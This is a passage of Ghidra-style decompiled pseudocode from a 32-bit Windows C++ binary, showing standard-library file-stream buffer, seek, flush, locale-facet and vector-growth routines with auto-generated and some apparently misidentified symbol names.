             (pvVar1 = (void *)((int)local_20 + 1), pvVar1 == (void *)0xffffffff)) {
            FUN_003ae350("string too long");
LAB_003a2461:
            pppuVar5 = local_30[0];
            if (local_1c < (void *)0x10) {
              pppuVar5 = local_30;
            }
            for (iVar6 = ((int)pppuVar5 - local_38) + (int)local_20; 0 < iVar6; iVar6 = iVar6 + -1)
            {
              _ungetc((int)*(char *)(iVar6 + -1 + local_38),*(FILE **)(param_1 + 0x54));
            }
            FUN_00389360(local_30);
            iVar6 = extraout_EDX_02;
            goto LAB_003a24b6;
          }
          if (local_1c < pvVar1) {
            FUN_00389950(local_30,pvVar1,local_20);
            if (pvVar1 != (void *)0x0) {
LAB_003a2348:
              pppuVar5 = local_30[0];
              if (local_1c < (void *)0x10) {
                pppuVar5 = local_30;
              }
              *(char *)((int)pppuVar5 + (int)local_20) = (char)iVar6;
              pppuVar5 = local_30[0];
              if (local_1c < (void *)0x10) {
                pppuVar5 = local_30;
              }
              local_20 = pvVar1;
              *(undefined *)((int)pppuVar5 + (int)pvVar1) = 0;
            }
          }
          else {
            if (pvVar1 != (void *)0x0) goto LAB_003a2348;
            pppuVar5 = local_30[0];
            if (local_1c < (void *)0x10) {
              pppuVar5 = local_30;
            }
            local_20 = pvVar1;
            *(undefined *)pppuVar5 = 0;
          }
          if (local_1c < (void *)0x10) {
            local_3c = local_30;
          }
          else {
            local_3c = local_30[0];
          }
          uVar7 = (**(code **)(**(int **)(param_1 + 0x44) + 0x10))
                            (param_1 + 0x4c,local_3c,(undefined *)((int)local_3c + (int)local_20),
                             &local_38,&local_31,local_30,&stack0xffffffc0,uVar3);
          iVar6 = (int)((ulonglong)uVar7 >> 0x20);
          iVar4 = (int)uVar7;
          if (iVar4 < 0) {
LAB_003a24a1:
            if ((void *)0xf < local_1c) {
              FUN_003aee4b(local_30[0]);
              iVar6 = extraout_EDX_03;
            }
            goto LAB_003a24b6;
          }
          if (iVar4 < 2) {
            if (in_stack_ffffffc0 != &local_31) goto LAB_003a2461;
            pppuVar5 = local_30[0];
            if (local_1c < (void *)0x10) {
              pppuVar5 = local_30;
            }
            FUN_003898c0(local_30,(int *)0x0,local_38 - (int)pppuVar5);
          }
          else {
            if (iVar4 != 3) goto LAB_003a24a1;
            if (local_20 != (void *)0x0) {
              pppuVar5 = local_30[0];
              if (local_1c < (void *)0x10) {
                pppuVar5 = local_30;
              }
              _memcpy_s(&local_31,1,pppuVar5,1);
              FUN_00389360(local_30);
              iVar6 = extraout_EDX_00;
              goto LAB_003a24b6;
            }
          }
          iVar6 = FID_conflict__getc(*(FILE **)(param_1 + 0x54));
        }
        FUN_00389360(local_30);
        iVar6 = extraout_EDX_01;
      }
    }
  }
  else {
    **(int **)(param_1 + 0x30) = **(int **)(param_1 + 0x30) + -1;
    iVar6 = **(int **)(param_1 + 0x20) + 1;
    **(int **)(param_1 + 0x20) = iVar6;
  }
LAB_003a24b6:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,iVar6,(char)in_stack_ffffffc0);
  return;
}



void __fastcall
FUN_003a24e0(int param_1,undefined4 param_2,undefined4 *param_3,uint param_4,uint param_5,
            int param_6)

{
  undefined4 uVar1;
  char cVar2;
  int iVar3;
  bool bVar4;
  undefined4 local_10;
  undefined4 local_c;
  
  if (((**(int **)(param_1 + 0x20) == param_1 + 0x48) && (param_6 == 1)) &&
     (*(int *)(param_1 + 0x44) == 0)) {
    bVar4 = param_4 != 0;
    param_4 = param_4 - 1;
    param_5 = (param_5 - 1) + (uint)bVar4;
  }
  if ((((*(int *)(param_1 + 0x54) != 0) &&
       (cVar2 = FUN_003a2bd0(*(int **)(param_1 + 0x20),param_2), cVar2 != '\0')) &&
      ((((param_4 | param_5) == 0 && (param_6 == 1)) ||
       (iVar3 = __fseeki64(*(FILE **)(param_1 + 0x54),CONCAT44(param_5,param_4),param_6), iVar3 == 0
       )))) && (iVar3 = _fgetpos(*(FILE **)(param_1 + 0x54),(fpos_t *)&local_10), iVar3 == 0)) {
    if (**(int **)(param_1 + 0x10) == param_1 + 0x48) {
      uVar1 = *(undefined4 *)(param_1 + 0x40);
      **(int **)(param_1 + 0x10) = *(int *)(param_1 + 0x3c);
      **(undefined4 **)(param_1 + 0x20) = uVar1;
      **(undefined4 **)(param_1 + 0x30) = 0;
    }
    param_3[2] = local_10;
    uVar1 = *(undefined4 *)(param_1 + 0x4c);
    *param_3 = 0;
    param_3[1] = 0;
    param_3[3] = local_c;
    param_3[4] = uVar1;
    return;
  }
  param_3[1] = 0xffffffff;
  *param_3 = 0xffffffff;
  param_3[2] = 0;
  param_3[3] = 0;
  param_3[4] = 0;
  return;
}



void __fastcall
FUN_003a25e0(int param_1,undefined4 param_2,undefined4 *param_3,uint param_4,uint param_5,
            undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  undefined4 uVar1;
  char cVar2;
  int iVar3;
  undefined4 local_10;
  undefined4 local_c;
  
  local_c = param_7;
  local_10 = param_6;
  if ((((*(int *)(param_1 + 0x54) != 0) && (cVar2 = FUN_003a2bd0(0,param_2), cVar2 != '\0')) &&
      (iVar3 = _fsetpos(*(FILE **)(param_1 + 0x54),(fpos_t *)&local_10), iVar3 == 0)) &&
     ((((param_4 | param_5) == 0 ||
       (iVar3 = __fseeki64(*(FILE **)(param_1 + 0x54),CONCAT44(param_5,param_4),1), iVar3 == 0)) &&
      (iVar3 = _fgetpos(*(FILE **)(param_1 + 0x54),(fpos_t *)&local_10), iVar3 == 0)))) {
    *(undefined4 *)(param_1 + 0x4c) = param_8;
    FUN_003a2d70();
    param_3[2] = local_10;
    uVar1 = *(undefined4 *)(param_1 + 0x4c);
    *param_3 = 0;
    param_3[1] = 0;
    param_3[3] = local_c;
    param_3[4] = uVar1;
    return;
  }
  *param_3 = 0xffffffff;
  param_3[1] = 0xffffffff;
  param_3[2] = 0;
  param_3[3] = 0;
  param_3[4] = 0;
  return;
}



int __thiscall FUN_003a26c0(void *this,char *param_1,uint param_2,uint param_3)

{
  int iVar1;
  
  if (*(FILE **)((int)this + 0x54) != (FILE *)0x0) {
    if ((param_1 == (char *)0x0) && ((param_2 | param_3) == 0)) {
      iVar1 = 4;
    }
    else {
      iVar1 = 0;
    }
    iVar1 = _setvbuf(*(FILE **)((int)this + 0x54),param_1,iVar1,param_2);
    if (iVar1 == 0) {
      FUN_003a2b30(*(void **)((int)this + 0x54),1);
      return (int)this;
    }
  }
  return (int)(void *)0x0;
}



undefined4 __fastcall FUN_003a2720(int *param_1)

{
  int iVar1;
  
  if (param_1[0x15] != 0) {
    iVar1 = (**(code **)(*param_1 + 0xc))(0xffffffff);
    if (iVar1 != -1) {
      iVar1 = _fflush((FILE *)param_1[0x15]);
      if (iVar1 < 0) {
        return 0xffffffff;
      }
    }
  }
  return 0;
}



void FUN_003a2750(undefined4 param_1)

{
  FUN_003a33e0();
  FUN_003a2d00();
  return;
}



undefined ** __thiscall FUN_003a2770(void *this,byte param_1)

{
  undefined **ppuVar1;
  
  ppuVar1 = (undefined **)((int)this + -0x10);
  *(undefined ***)(*(int *)(*ppuVar1 + 4) + -0x10 + (int)this) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)this = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(ppuVar1);
  }
  return ppuVar1;
}



undefined ** __thiscall FUN_003a27b0(void *this,byte param_1)

{
  FUN_003a18e0((undefined **)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



undefined ** __thiscall FUN_003a27e0(void *this,byte param_1)

{
  FUN_003a1e20((undefined4 *)this);
  *(undefined ***)this = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b((undefined **)((int)this + -0x68));
  }
  return (undefined **)((int)this + -0x68);
}



undefined ** __fastcall FUN_003a2820(undefined **param_1,undefined **param_2,byte param_3)

{
  undefined *puVar1;
  undefined **ppuVar2;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3618;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  *param_1 = (undefined *)std::basic_filebuf<char,struct_std::char_traits<char>_>::vftable;
  local_8 = 0;
  ppuVar2 = param_1;
  if (param_1[0x15] != (undefined *)0x0) {
    ppuVar2 = (undefined **)param_1[4];
    param_2 = param_1 + 0x12;
    if ((undefined **)*ppuVar2 == param_2) {
      puVar1 = param_1[0x10];
      *ppuVar2 = param_1[0xf];
      ppuVar2 = (undefined **)param_1[8];
      *ppuVar2 = puVar1;
      param_2 = (undefined **)param_1[0xc];
      *param_2 = (undefined *)0x0;
    }
  }
  if (*(char *)(param_1 + 0x14) != '\0') {
    FUN_003a2aa0(ppuVar2,param_2);
  }
  local_8 = 0xffffffff;
  FUN_003a18e0(param_1);
  if ((param_3 & 1) != 0) {
    FUN_003aee4b(param_1);
  }
  *in_FS_OFFSET = local_10;
  return param_1;
}



void FUN_003a28c0(void)

{
  uint uVar1;
  undefined (*lorem_ipsum) [16];
  undefined (*unaff_ESI) [16];
  
  *(undefined4 *)(unaff_ESI[1] + 4) = 0xf;
  *(undefined4 *)unaff_ESI[1] = 0;
  (*unaff_ESI)[0] = 0;
  if (*(undefined **)(unaff_ESI[1] + 4) < &DAT_00000008) {
    FUN_00389950(unaff_ESI,&DAT_00000008,*(void **)unaff_ESI[1]);
  }
  lorem_ipsum = unaff_ESI;
  if (0xf < *(uint *)(unaff_ESI[1] + 4)) {
    lorem_ipsum = *(undefined (**) [16])*unaff_ESI;
  }
  trim_string(lorem_ipsum,0,8);
  uVar1 = *(uint *)(unaff_ESI[1] + 4);
  *(undefined **)unaff_ESI[1] = &DAT_00000008;
  if (uVar1 < 0x10) {
    (*unaff_ESI)[8] = 0;
    return;
  }
  *(undefined *)(*(int *)*unaff_ESI + 8) = 0;
  return;
}



uint FUN_003a2920(void)

{
  int iVar1;
  uint uVar2;
  void *this;
  int *unaff_EDI;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 uStack8;
  
  uStack8 = 0xffffffff;
  puStack12 = &LAB_003c35f0;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  iVar1 = *(int *)(*(int *)(*unaff_EDI + 4) + 0xc + (int)unaff_EDI);
  this = (void *)(*(int *)(*unaff_EDI + 4) + (int)unaff_EDI);
  if (iVar1 == 0) {
    if (*(int *)((int)this + 0x3c) != 0) {
      iVar1 = FUN_003a1860();
    }
    this = (void *)(*(int *)(*unaff_EDI + 4) + (int)unaff_EDI);
    if (*(int *)((int)this + 0xc) == 0) {
      *in_FS_OFFSET = local_10;
      return CONCAT31((int3)((uint)iVar1 >> 8),1);
    }
  }
  uVar2 = *(uint *)((int)this + 0xc) | 2;
  if (*(int *)((int)this + 0x38) == 0) {
    uVar2 = *(uint *)((int)this + 0xc) | 6;
  }
  uVar2 = uVar2 & 0x17;
  *(uint *)((int)this + 0xc) = uVar2;
  if ((*(uint *)((int)this + 0x10) & uVar2) != 0) {
    uVar2 = FUN_00399780(this,(char *)0x0);
  }
  *in_FS_OFFSET = local_10;
  return uVar2 & 0xffffff00;
}



void FUN_003a29c0(void)

{
  int in_EAX;
  
  if (**(int **)(in_EAX + 0x20) != 0) {
    return;
  }
  return;
}



void FUN_003a29e0(void)

{
  int in_EAX;
  
  if (**(int **)(in_EAX + 0x24) != 0) {
    return;
  }
  return;
}



int __fastcall FUN_003a2a00(char *param_1,int param_2,uint param_3)

{
  void *this;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2d68;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  if (*(int *)(param_2 + 0x54) == 0) {
    this = (void *)FUN_003aeab6(param_1,param_3,0x40);
    if (this != (void *)0x0) {
      FUN_003a2b30(this,1);
      FUN_003a2f60();
      local_8 = 0;
      FUN_003a33e0();
      FUN_003a2d00();
      FUN_00399480(&param_3);
      *in_FS_OFFSET = local_10;
      return param_2;
    }
  }
  *in_FS_OFFSET = local_10;
  return 0;
}



int __fastcall FUN_003a2aa0(undefined4 param_1,undefined4 param_2)

{
  undefined4 uVar1;
  char cVar2;
  int in_EAX;
  int iVar3;
  int iVar4;
  
  if (*(int *)(in_EAX + 0x54) != 0) {
    cVar2 = FUN_003a2bd0(param_1,param_2);
    iVar4 = in_EAX;
    if (cVar2 == '\0') {
      iVar4 = 0;
    }
    iVar3 = _fclose(*(FILE **)(in_EAX + 0x54));
    if (iVar3 == 0) goto LAB_003a2acb;
  }
  iVar4 = 0;
LAB_003a2acb:
  *(int *)(in_EAX + 0x10) = in_EAX + 8;
  *(undefined *)(in_EAX + 0x50) = 0;
  *(undefined *)(in_EAX + 0x49) = 0;
  *(int *)(in_EAX + 0x20) = in_EAX + 0x18;
  *(int *)(in_EAX + 0x24) = in_EAX + 0x1c;
  *(undefined4 **)(in_EAX + 0x14) = (undefined4 *)(in_EAX + 0xc);
  *(int *)(in_EAX + 0x30) = in_EAX + 0x28;
  *(int *)(in_EAX + 0x34) = in_EAX + 0x2c;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  **(undefined4 **)(in_EAX + 0x24) = 0;
  **(undefined4 **)(in_EAX + 0x34) = 0;
  **(undefined4 **)(in_EAX + 0x10) = 0;
  uVar1 = DAT_003d9818;
  **(undefined4 **)(in_EAX + 0x20) = 0;
  **(undefined4 **)(in_EAX + 0x30) = 0;
  *(undefined4 *)(in_EAX + 0x54) = 0;
  *(undefined4 *)(in_EAX + 0x44) = 0;
  *(undefined4 *)(in_EAX + 0x4c) = uVar1;
  return iVar4;
}



void __thiscall FUN_003a2b30(void *this,int param_1)

{
  int in_EAX;
  
  *(int *)(in_EAX + 0x20) = in_EAX + 0x18;
  *(bool *)(in_EAX + 0x50) = param_1 == 1;
  *(int *)(in_EAX + 0x24) = in_EAX + 0x1c;
  *(int *)(in_EAX + 0x10) = in_EAX + 8;
  *(int *)(in_EAX + 0x30) = in_EAX + 0x28;
  *(undefined *)(in_EAX + 0x49) = 0;
  *(undefined4 **)(in_EAX + 0x14) = (undefined4 *)(in_EAX + 0xc);
  *(int *)(in_EAX + 0x34) = in_EAX + 0x2c;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  **(undefined4 **)(in_EAX + 0x24) = 0;
  **(undefined4 **)(in_EAX + 0x34) = 0;
  **(undefined4 **)(in_EAX + 0x10) = 0;
  **(undefined4 **)(in_EAX + 0x20) = 0;
  **(undefined4 **)(in_EAX + 0x30) = 0;
  if (this != (void *)0x0) {
    *(int *)(in_EAX + 0x10) = (int)this + 8;
    *(int *)(in_EAX + 0x14) = (int)this + 8;
    *(void **)(in_EAX + 0x20) = this;
    *(void **)(in_EAX + 0x24) = this;
    *(int *)(in_EAX + 0x30) = (int)this + 4;
    *(int *)(in_EAX + 0x34) = (int)this + 4;
  }
  *(void **)(in_EAX + 0x54) = this;
  *(undefined4 *)(in_EAX + 0x4c) = DAT_003d9818;
  *(undefined4 *)(in_EAX + 0x44) = 0;
  return;
}



void __fastcall FUN_003a2bd0(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 ****ppppuVar2;
  size_t sVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  size_t _Count;
  int *unaff_EDI;
  int **in_FS_OFFSET;
  undefined8 uVar4;
  undefined uVar5;
  int in_stack_ffffffcc;
  undefined4 ****local_30 [4];
  int local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3168;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  if ((unaff_EDI[0x11] != 0) && (*(char *)((int)unaff_EDI + 0x49) != '\0')) {
    uVar4 = (**(code **)(*unaff_EDI + 0xc))(0xffffffff,local_14);
    param_2 = (undefined4)((ulonglong)uVar4 >> 0x20);
    if ((int)uVar4 == -1) {
LAB_003a2ccc:
      uVar5 = (undefined)in_stack_ffffffcc;
      goto LAB_003a2cda;
    }
    FUN_003a28c0();
    local_8 = 0;
    while( true ) {
      ppppuVar2 = local_30[0];
      if (local_1c < 0x10) {
        ppppuVar2 = local_30;
      }
      iVar1 = (**(code **)(*(int *)unaff_EDI[0x11] + 0x18))
                        (unaff_EDI + 0x13,ppppuVar2,(int)ppppuVar2 + local_20,&stack0xffffffcc);
      if (iVar1 != 0) break;
      *(undefined *)((int)unaff_EDI + 0x49) = 0;
LAB_003a2c70:
      ppppuVar2 = local_30[0];
      if (local_1c < 0x10) {
        ppppuVar2 = local_30;
      }
      _Count = in_stack_ffffffcc - (int)ppppuVar2;
      if (_Count != 0) {
        ppppuVar2 = local_30[0];
        if (local_1c < 0x10) {
          ppppuVar2 = local_30;
        }
        sVar3 = _fwrite(ppppuVar2,1,_Count,(FILE *)unaff_EDI[0x15]);
        if (_Count != sVar3) goto LAB_003a2cc7;
      }
      if (*(char *)((int)unaff_EDI + 0x49) == '\0') goto LAB_003a2cd3;
      if (_Count == 0) {
        FUN_00396020(0);
      }
    }
    if (iVar1 == 1) goto LAB_003a2c70;
    if (iVar1 != 3) {
LAB_003a2cc7:
      FUN_00389360(local_30);
      param_2 = extraout_EDX;
      goto LAB_003a2ccc;
    }
LAB_003a2cd3:
    FUN_00389360(local_30);
    param_2 = extraout_EDX_00;
  }
  uVar5 = (undefined)in_stack_ffffffcc;
LAB_003a2cda:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,param_2,uVar5);
  return;
}



void FUN_003a2d00(void)

{
  char cVar1;
  int unaff_ESI;
  int *unaff_EDI;
  
  cVar1 = (**(code **)(*unaff_EDI + 4))();
  if (cVar1 != '\0') {
    *(undefined4 *)(unaff_ESI + 0x44) = 0;
    return;
  }
  *(int *)(unaff_ESI + 0x10) = unaff_ESI + 8;
  *(int *)(unaff_ESI + 0x20) = unaff_ESI + 0x18;
  *(int *)(unaff_ESI + 0x24) = unaff_ESI + 0x1c;
  *(int **)(unaff_ESI + 0x44) = unaff_EDI;
  *(undefined4 **)(unaff_ESI + 0x14) = (undefined4 *)(unaff_ESI + 0xc);
  *(int *)(unaff_ESI + 0x30) = unaff_ESI + 0x28;
  *(int *)(unaff_ESI + 0x34) = unaff_ESI + 0x2c;
  *(undefined4 *)(unaff_ESI + 0xc) = 0;
  **(undefined4 **)(unaff_ESI + 0x24) = 0;
  **(undefined4 **)(unaff_ESI + 0x34) = 0;
  **(undefined4 **)(unaff_ESI + 0x10) = 0;
  **(undefined4 **)(unaff_ESI + 0x20) = 0;
  **(undefined4 **)(unaff_ESI + 0x30) = 0;
  return;
}



void FUN_003a2d70(void)

{
  undefined4 uVar1;
  int in_EAX;
  
  if (**(int **)(in_EAX + 0x10) == in_EAX + 0x48) {
    uVar1 = *(undefined4 *)(in_EAX + 0x40);
    **(int **)(in_EAX + 0x10) = *(int *)(in_EAX + 0x3c);
    **(undefined4 **)(in_EAX + 0x20) = uVar1;
    **(undefined4 **)(in_EAX + 0x30) = 0;
  }
  return;
}



void FUN_003a2da0(void)

{
  int iVar1;
  int iVar2;
  int in_EAX;
  
  iVar2 = **(int **)(in_EAX + 0x10);
  iVar1 = in_EAX + 0x48;
  if (iVar2 != iVar1) {
    *(int *)(in_EAX + 0x3c) = iVar2;
    *(int *)(in_EAX + 0x40) = **(int **)(in_EAX + 0x30) + **(int **)(in_EAX + 0x20);
  }
  **(int **)(in_EAX + 0x10) = iVar1;
  **(int **)(in_EAX + 0x20) = iVar1;
  **(int **)(in_EAX + 0x30) = (in_EAX - iVar1) + 0x49;
  return;
}



undefined4
FUN_003a2de0(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4,
            undefined4 param_5,undefined4 param_6,undefined4 *param_7)

{
  *param_4 = param_2;
  *param_7 = param_5;
  return 3;
}



undefined4
FUN_003a2e00(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4)

{
  *param_4 = param_2;
  return 3;
}



uint FUN_003a2e20(undefined4 param_1,int param_2,int param_3,uint param_4)

{
  uint uVar1;
  
  uVar1 = param_3 - param_2;
  if (param_4 < (uint)(param_3 - param_2)) {
    uVar1 = param_4;
  }
  return uVar1;
}



undefined ** __thiscall FUN_003a2e40(void *this,byte param_1)

{
  *(undefined ***)this = std::locale::facet::vftable;
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



undefined ** FUN_003a2e70(undefined **param_1)

{
  _Locimp **pp_Var1;
  _Locimp *p_Var2;
  int iVar3;
  int **in_FS_OFFSET;
  int local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2d3b;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  *param_1 = (undefined *)std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;
  std::_Mutex::_Mutex((_Mutex *)(param_1 + 1));
  local_8 = 0;
  pp_Var1 = (_Locimp **)FUN_003b103e(4);
  if (pp_Var1 == (_Locimp **)0x0) {
    pp_Var1 = (_Locimp **)0x0;
  }
  else {
    p_Var2 = std::locale::_Init();
    *pp_Var1 = p_Var2;
    iVar3 = _ENGINE_get_table_flags();
    std::_Lockit::_Lockit((_Lockit *)&local_14,0);
    if (*(int *)(iVar3 + 4) != -1) {
      *(int *)(iVar3 + 4) = *(int *)(iVar3 + 4) + 1;
    }
    FUN_003ae995(&local_14);
  }
  param_1[4] = (undefined *)(param_1 + 2);
  param_1[8] = (undefined *)(param_1 + 6);
  param_1[9] = (undefined *)(param_1 + 7);
  param_1[0xe] = (undefined *)pp_Var1;
  param_1[5] = (undefined *)(param_1 + 3);
  param_1[0xc] = (undefined *)(param_1 + 10);
  param_1[0xd] = (undefined *)(param_1 + 0xb);
  param_1[3] = (undefined *)0x0;
  *(undefined4 *)param_1[9] = 0;
  *(undefined4 *)param_1[0xd] = 0;
  *(undefined4 *)param_1[4] = 0;
  *(undefined4 *)param_1[8] = 0;
  *(undefined4 *)param_1[0xc] = 0;
  *in_FS_OFFSET = local_10;
  return param_1;
}



void FUN_003a2f60(void)

{
  int iVar1;
  int in_EAX;
  int *unaff_EDI;
  int local_8;
  
  iVar1 = **(int **)(in_EAX + 0x38);
  *unaff_EDI = iVar1;
  std::_Lockit::_Lockit((_Lockit *)&local_8,0);
  if (*(int *)(iVar1 + 4) != -1) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
  }
  FUN_003ae995(&local_8);
  return;
}



void FUN_003a2fa0(uint param_1,undefined4 param_2)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  code **ppcVar4;
  int **in_FS_OFFSET;
  int local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3138;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  FUN_00399850();
  local_8 = 0;
  piVar3 = (int *)FUN_003a3240();
  local_8 = 0xffffffff;
  if (param_1 != 0) {
    std::_Lockit::_Lockit((_Lockit *)&local_14,0);
    iVar1 = *(int *)(param_1 + 4);
    if ((iVar1 != 0) && (iVar1 != -1)) {
      *(int *)(param_1 + 4) = iVar1 + -1;
    }
    iVar1 = *(int *)(param_1 + 4);
    FUN_003ae995(&local_14);
    ppcVar4 = (code **)(~-(uint)(iVar1 != 0) & param_1);
    if (ppcVar4 != (code **)0x0) {
      (**(code **)*ppcVar4)(1,uVar2);
    }
  }
  (**(code **)(*piVar3 + 0x18))(param_2);
  *in_FS_OFFSET = local_10;
  return;
}



void __fastcall FUN_003a3050(int *param_1)

{
  int iVar1;
  uint uVar2;
  int *extraout_ECX;
  uint uVar3;
  
  iVar1 = *param_1;
  uVar3 = (param_1[1] - iVar1) / 0x1c;
  if (0x9249248 < uVar3) {
    FUN_003ae350("vector<T> too long");
    param_1 = extraout_ECX;
  }
  uVar2 = (param_1[2] - iVar1) / 0x1c;
  uVar3 = uVar3 + 1;
  if (uVar2 < uVar3) {
    if (0x9249249 - (uVar2 >> 1) < uVar2) {
      uVar2 = 0;
    }
    else {
      uVar2 = uVar2 + (uVar2 >> 1);
    }
    if (uVar2 < uVar3) {
      uVar2 = uVar3;
    }
    FUN_003a30d0(param_1,uVar2);
  }
  return;
}



void __thiscall FUN_003a30d0(void *this,uint param_1)

{
  int iVar1;
  int iVar2;
  void **ppvVar3;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c35d0;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  if (0x9249249 < param_1) {
    FUN_003ae350("vector<T> too long");
  }
                    // WARNING: Load size is inaccurate
  if ((uint)((*(int *)((int)this + 8) - *this) / 0x1c) < param_1) {
    ppvVar3 = (void **)FUN_003a31e0(param_1);
    local_8 = 0;
                    // WARNING: Load size is inaccurate
    FUN_003a37b0(*this,*(void ***)((int)this + 4),ppvVar3);
                    // WARNING: Load size is inaccurate
    iVar1 = *this;
    iVar2 = *(int *)((int)this + 4);
    if (iVar1 != 0) {
      FUN_00398480();
                    // WARNING: Load size is inaccurate
      FUN_003aee4b(*this);
    }
    *(void ***)((int)this + 8) = ppvVar3 + param_1 * 7;
    *(void ***)((int)this + 4) = ppvVar3 + ((iVar2 - iVar1) / 0x1c) * 7;
    *(void ***)this = ppvVar3;
  }
  *in_FS_OFFSET = local_10;
  return;
}



void Catch_All_003a31bf(void)

{
  int unaff_EBP;
  
  FUN_003aee4b(*(void **)(unaff_EBP + -0x14));
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



int __fastcall FUN_003a31e0(uint param_1)

{
  int iVar1;
  undefined **local_14 [3];
  char *local_8;
  
  if (param_1 == 0) {
    return 0;
  }
  if ((param_1 < 0x924924a) && (iVar1 = FUN_003b103e(param_1 * 0x1c), iVar1 != 0)) {
    return iVar1;
  }
  local_8 = (char *)0x0;
  std::exception::exception((exception *)local_14,&local_8);
  local_14[0] = std::bad_alloc::vftable;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(local_14,&DAT_003d3140);
}



int FUN_003a3240(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  undefined extraout_DL;
  int *unaff_EDI;
  int **in_FS_OFFSET;
  undefined *local_28 [3];
  int local_1c;
  int local_18;
  int local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2c98;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  std::_Lockit::_Lockit((_Lockit *)&local_1c,0);
  iVar3 = DAT_003d981c;
  local_8 = 0;
  local_14 = DAT_003d981c;
  if (DAT_003d7b08 == 0) {
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (DAT_003d7b08 == 0) {
      DAT_003d7b04 = DAT_003d7b04 + 1;
      DAT_003d7b08 = DAT_003d7b04;
    }
    FUN_003ae995(&local_18);
  }
  uVar1 = DAT_003d7b08;
  iVar2 = *unaff_EDI;
  if (DAT_003d7b08 < *(uint *)(iVar2 + 0xc)) {
    iVar4 = *(int *)(*(int *)(iVar2 + 8) + DAT_003d7b08 * 4);
    if (iVar4 == 0) goto LAB_003a32cc;
LAB_003a32ea:
    if (iVar4 != 0) goto LAB_003a3353;
  }
  else {
    iVar4 = 0;
LAB_003a32cc:
    if (*(char *)(iVar2 + 0x14) == '\0') goto LAB_003a32ea;
    iVar2 = _ENGINE_get_table_flags();
    if (uVar1 < *(uint *)(iVar2 + 0xc)) {
      iVar4 = *(int *)(*(int *)(iVar2 + 8) + uVar1 * 4);
      goto LAB_003a32ea;
    }
  }
  iVar4 = iVar3;
  if (iVar3 == 0) {
    iVar3 = FUN_00399530(&local_14);
    iVar4 = local_14;
    if (iVar3 == -1) {
      FUN_003b0a93(local_28,extraout_DL,0xc);
                    // WARNING: Subroutine does not return
      __CxxThrowException_8(local_28,&DAT_003d320c);
    }
    DAT_003d981c = local_14;
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (*(int *)(iVar4 + 4) != -1) {
      *(int *)(iVar4 + 4) = *(int *)(iVar4 + 4) + 1;
    }
    FUN_003ae995(&local_18);
    Facet_Register(iVar4);
  }
LAB_003a3353:
  local_8 = 0xffffffff;
  FUN_003ae995(&local_1c);
  *in_FS_OFFSET = local_10;
  return iVar4;
}



uint FUN_003a3380(void)

{
  uint uVar1;
  undefined4 *in_EAX;
  size_t sVar2;
  uint uVar3;
  
  sVar2 = _strlen("");
  uVar1 = in_EAX[4];
  uVar3 = uVar1;
  if (sVar2 <= uVar1) {
    uVar3 = sVar2;
  }
  if (0xf < (uint)in_EAX[5]) {
    in_EAX = (undefined4 *)*in_EAX;
  }
  uVar3 = _memcmp(in_EAX,&DAT_003ce656,uVar3);
  if (uVar3 == 0) {
    if (uVar1 < sVar2) {
      return 0xffffff01;
    }
    uVar3 = (uint)(uVar1 != sVar2);
  }
  return uVar3 & 0xffffff00 | (uint)(uVar3 != 0);
}



undefined * FUN_003a33e0(void)

